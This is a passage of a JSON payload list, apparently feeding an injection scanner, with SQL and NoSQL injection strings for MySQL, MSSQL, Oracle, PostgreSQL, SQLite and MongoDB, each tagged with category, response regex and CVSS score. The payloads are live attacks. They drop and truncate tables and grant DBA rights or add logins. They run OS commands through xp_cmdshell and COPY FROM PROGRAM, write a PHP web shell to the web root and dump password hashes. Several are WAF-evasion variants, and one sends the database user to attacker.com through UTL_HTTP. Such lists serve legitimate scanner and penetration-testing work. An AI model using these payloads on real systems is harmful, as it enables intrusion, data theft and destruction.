    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC'--",
    "dbms": "Oracle",
    "category": "stacked",
    "matcher": "(?i)(grant|ora-|error|privilege)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;--",
    "dbms": "Oracle",
    "category": "stacked",
    "matcher": "(?i)(ora-|drop|error|execute|plsql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; DECLARE @v VARCHAR(100); SET @v=@@version; SELECT @v--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(microsoft sql server|sql server [0-9]+)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; SELECT 1; SELECT 2; SELECT 3--",
    "dbms": "PostgreSQL",
    "category": "stacked",
    "matcher": "(?i)(1|2|3|error|result)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; CREATE USER hacker IDENTIFIED BY 'pass'--",
    "dbms": "Oracle",
    "category": "stacked",
    "matcher": "(?i)(create|user|ora-|error|privilege)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; SHUTDOWN--",
    "dbms": "MySQL",
    "category": "stacked",
    "matcher": "(?i)(shutdown|error|connection|refused)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; CALL mysql.rds_kill_query(1)--",
    "dbms": "MySQL",
    "category": "stacked",
    "matcher": "(?i)(error|killed|mysql|query)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "'; SELECT * INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '' LINES TERMINATED BY '<?php system($_GET[cmd]); ?>'--",
    "dbms": "MySQL",
    "category": "stacked",
    "matcher": "(?i)(outfile|error|permission|syntax|query)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXEC xp_regread('HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion','ProductName')--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(windows|server|microsoft|error)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXEC sp_addlogin 'hacker','password'--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(error|login|sql server|added)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "1 ORDER BY 1--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY 2--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY 100--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(unknown column|out of range|error|order)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY 1,2--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY 1 ASC--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY 1 DESC--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' ORDER BY 1--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' ORDER BY 5--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' ORDER BY 99--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(unknown column|out of range|error|order|1054)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 GROUP BY 1--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 GROUP BY 1,2,3--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 GROUP BY 100--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(unknown column|out of range|error|group|1054)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 HAVING 1=1--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 HAVING 1=2--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' ORDER BY (CASE WHEN 1=1 THEN name ELSE id END)--",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "/*!50000 ' AND 1=1*/--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' /*!AND*/ 1=1--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION/**/SELECT/**/1,2,3--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(1|2|3|version|user|result)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION%20SELECT%201,2,3--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(1|2|3|version|user|result)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION%0ASELECT%0A1,version(),3--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mysql|mariadb)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNiOn SeLeCt 1,version(),3--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mysql|mariadb)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 0x31=0x31--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND CHAR(49)=CHAR(49)--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AnD sLeEp({N})--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'/**/AND/**/SLEEP({N})--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT * FROM (SELECT SLEEP({N}))a)--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "1;SELECT/**/SLEEP({N})--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR 1=1--\n",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "%27%20OR%201%3D1--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR 1=1#",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR 1=1/*",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' /*!OR*/ 1=1--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR 0x313d31--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR true--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR 2>1--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR 'unusual'='unusual",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR 1=1 LIMIT 1--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,2,3 FROM dual--",
    "dbms": "Oracle",
    "category": "waf_bypass",
    "matcher": "(?i)(1|2|3|dual|oracle|result)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION ALL SELECT 'a',NULL,NULL--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(a|null|result|data)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT version(),'b','c'--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mariadb|mysql)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "{\"$gt\": \"\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success|true)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$ne\": null}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$exists\": true}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$regex\": \".*\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(welcome|home|logged in|dashboard|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(welcome|home|logged in|dashboard|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$where\": \"1==1\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$where\": \"function(){return true}\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$where\": \"sleep({N})\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "{\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(welcome|home|logged in|dashboard|admin)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,2,3,4,5--",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(1|2|3|4|5|result|data)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(null|result|data|--)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT 1,2,3 UNION SELECT 4,5,6--",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(1|2|3|4|5|6|result|data)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(users|accounts|admin|orders|products)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,column_name,data_type FROM information_schema.columns WHERE table_name='users'--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(id|username|password|email|varchar|int)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,grantee,privilege_type FROM information_schema.user_privileges--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(select|insert|update|delete|all privileges)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,routine_name,routine_type FROM information_schema.routines--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(procedure|function|routine|sql)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,event_name,event_body FROM information_schema.events--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(event|begin|end|select|sql)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,trigger_name,event_manipulation FROM information_schema.triggers--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(trigger|insert|update|delete|sql)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(updatexml|xpath|users|accounts|admin)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(xpath|extractvalue|password|username|email)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=2 UNION SELECT 1,IFNULL(NULL,version()),3--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mysql|mariadb)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' ORDER BY 1 UNION SELECT 1,version(),3--",
    "dbms": "MySQL",
    "category": "order_by",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mysql|mariadb)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; CREATE OR REPLACE FUNCTION sleep_for_seconds() RETURNS void AS $$ BEGIN PERFORM pg_sleep({N}); END; $$ LANGUAGE plpgsql--",
    "dbms": "PostgreSQL",
    "category": "stacked",
    "matcher": "TIME>{N}",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; SELECT pg_ls_dir('/')--",
    "dbms": "PostgreSQL",
    "category": "stacked",
    "matcher": "(?i)(etc|var|usr|tmp|home|bin)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND 1=CAST((SELECT current_schema()) AS INT)--",
    "dbms": "PostgreSQL",
    "category": "error",
    "matcher": "(?i)(invalid input syntax|public|schema|cannot cast)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=(SELECT 1 FROM pg_user WHERE usename=current_user LIMIT 1)--",
    "dbms": "PostgreSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' UNION SELECT NULL,usename,passwd FROM pg_shadow--",
    "dbms": "PostgreSQL",
    "category": "union",
    "matcher": "(?i)(md5|postgres|admin|sha|user)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; CREATE TABLE cmd_exec(cmd_output TEXT); COPY cmd_exec FROM PROGRAM 'id'--",
    "dbms": "PostgreSQL",
    "category": "stacked",
    "matcher": "(?i)(uid=|gid=|groups=|root|postgres)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND 1=CONVERT(INT,@@servername)--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|nvarchar|server|hostname)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|master|msdb|tempdb)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; EXEC xp_cmdshell('net user')--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(administrator|guest|user accounts|command completed)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXEC xp_cmdshell('ipconfig')--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(ipv4|subnet|default gateway|windows ip)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,name,NULL FROM sys.tables--",
    "dbms": "MSSQL",
    "category": "union",
    "matcher": "(?i)(users|accounts|admin|orders|products)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--",
    "dbms": "MSSQL",
    "category": "union",
    "matcher": "(?i)(id|username|password|email|col)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
    "dbms": "Oracle",
    "category": "union",
    "matcher": "(?i)(users|accounts|dual|admin|orders)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--",
    "dbms": "Oracle",
    "category": "union",
    "matcher": "(?i)(id|username|password|email|col)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,username||':'||password,NULL FROM users--",
    "dbms": "Oracle",
    "category": "union",
    "matcher": "(?i)(admin:|root:|user:|[a-f0-9]{32})",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,(SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables),NULL FROM dual--",
    "dbms": "Oracle",
    "category": "union",
    "matcher": "(?i)(users|accounts|dual|admin|products)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND ROWNUM=1 AND 1=1--",
    "dbms": "Oracle",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM user_tables)>0--",
    "dbms": "Oracle",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'--",
    "dbms": "SQLite",
    "category": "union",
    "matcher": "(?i)(create table|primary key|varchar|integer)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table' ORDER BY name--",
    "dbms": "SQLite",
    "category": "union",
    "matcher": "(?i)(users|accounts|admin|orders|products)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND 1=CAST(sqlite_version() AS INTEGER)--",
    "dbms": "SQLite",
    "category": "error",
    "matcher": "(?i)(datatype mismatch|invalid|error|3\\.[0-9])",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND TYPEOF(1)='integer'--",
    "dbms": "SQLite",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' UNION SELECT NULL,GROUP_CONCAT(name||':'||sql),NULL FROM sqlite_master--",
    "dbms": "SQLite",
    "category": "union",
    "matcher": "(?i)(create table|primary|varchar|integer|text)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND 1=1 UNION SELECT 1,2,3--+",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(1|2|3|result|data|version)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=1--+",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "';EXEC(0x73656c65637420404076657273696f6e)--",
    "dbms": "MSSQL",
    "category": "waf_bypass",
    "matcher": "(?i)(microsoft sql server|sql server [0-9]+)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=1 UNION ALL SELECT 1,@@version,3 WITH(NOLOCK)--",
    "dbms": "MSSQL",
    "category": "waf_bypass",
    "matcher": "(?i)(microsoft sql server|sql server [0-9]+)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR (SELECT SUBSTRING(@@version,1,1))='M'--",
    "dbms": "MSSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' OR (SELECT SUBSTRING(version(),1,1))='P'--",
    "dbms": "PostgreSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' OR (SELECT SUBSTRING(version(),1,5))='8.0.3'--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT mid(version(),1,1))='5'--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND BINARY 'abc'='abc'--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 0b1=0b1--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1 BETWEEN 0 AND 2--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 3 NOT BETWEEN 0 AND 2--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 1 IN (1,2,3)--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 0 IN (1,2,3)--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 1 LIKE 1--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 1 REGEXP 1--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT 1 FROM (SELECT SLEEP({N}) UNION SELECT 0)a)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=1 UNION SELECT 1,2,SLEEP({N})--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR SLEEP({N}) AND '1'='1",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; DECLARE @d DATETIME SELECT @d=GETDATE() WHILE DATEDIFF(ss,@d,GETDATE())<{N} WAITFOR DELAY '0:0:1'--",
    "dbms": "MSSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND CASE WHEN 1=1 THEN (SELECT 1 FROM PG_SLEEP({N})) ELSE 1 END=1--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,(SELECT (CASE WHEN 1=1 THEN pg_sleep({N}) ELSE 0 END)),NULL--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=UTL_HTTP.REQUEST('http://attacker.com'||user)--",
    "dbms": "Oracle",
    "category": "error",
    "matcher": "(?i)(ora-|utl_http|network|connection|refused)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND 1=(SELECT DECODE(user,'SYS',DBMS_PIPE.RECEIVE_MESSAGE('a',{N}),1) FROM dual)--",
    "dbms": "Oracle",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,username,password FROM users WHERE '1'='1",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(admin|root|user|password|hash|md5|sha)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,email,NULL FROM users WHERE '1'='1",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(@|gmail|yahoo|hotmail|\\.com|\\.org)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; TRUNCATE TABLE users--",
    "dbms": "Generic",
    "category": "stacked",
    "matcher": "(?i)(truncate|table|affected|error|sql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; DELETE FROM users WHERE 1=1--",
    "dbms": "Generic",
    "category": "stacked",
    "matcher": "(?i)(delete|row|affected|error|sql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND 1=(SELECT COUNT(*) FROM users WHERE admin=1)--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' OR (ASCII(SUBSTR(password,1,1)) BETWEEN 48 AND 57)--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (ASCII(MID(user(),1,1)))=114--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY 1--\n",
    "dbms": "Generic",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1/**/ORDER/**/BY/**/1--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "1 ORDER BY 1+1--",
    "dbms": "MySQL",
    "category": "order_by",
